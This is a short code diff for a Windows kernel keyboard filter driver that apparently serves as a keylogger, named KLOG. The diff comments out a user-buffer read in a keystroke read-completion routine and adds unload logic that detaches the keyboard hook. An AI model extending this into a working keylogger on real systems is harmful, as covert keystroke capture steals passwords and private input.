@@ -74,7 +74,7 @@ NTSTATUS OnReadCompletion(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp, IN PVOI
 			keyboardBuffer = keys;
 
 
-			PVOID userBuffer = pIrp->UserBuffer;
+//			PVOID userBuffer = pIrp->UserBuffer;
 			PFILE_OBJECT fileObject = pIrp->Tail.Overlay.OriginalFileObject;
 			KdPrint(("ORC : "));
 
@@ -258,7 +258,25 @@ _Use_decl_annotations_
 VOID Unload(IN PDRIVER_OBJECT pDriverObject)
 {
 	KdPrint(("Unload IRQ Level [%u]", KeGetCurrentIrql()));
-	UNREFERENCED_PARAMETER(pDriverObject);
+	
 	// TODO: need to implement this
+
+
+
+	KdPrint(("Removing Control Device...\n"));
+	//RemoveControlDevice(pDriverObject);
+
+	KdPrint(("Unhooking Keyboard...\n"));
+	//UnhookKeyboard(pDriverObject);
+
+	PKLOG_DEVICE_EXTENSION pKeyboardDeviceExtension = (PKLOG_DEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;
+	IoDetachDevice(pKeyboardDeviceExtension->pKeyboardDevice);
+	DbgPrint("Keyboard hook detached from device...\n");
+
+	IoDeleteDevice(pDriverObject->DeviceObject);
+
 	return;
 }
+
+
+
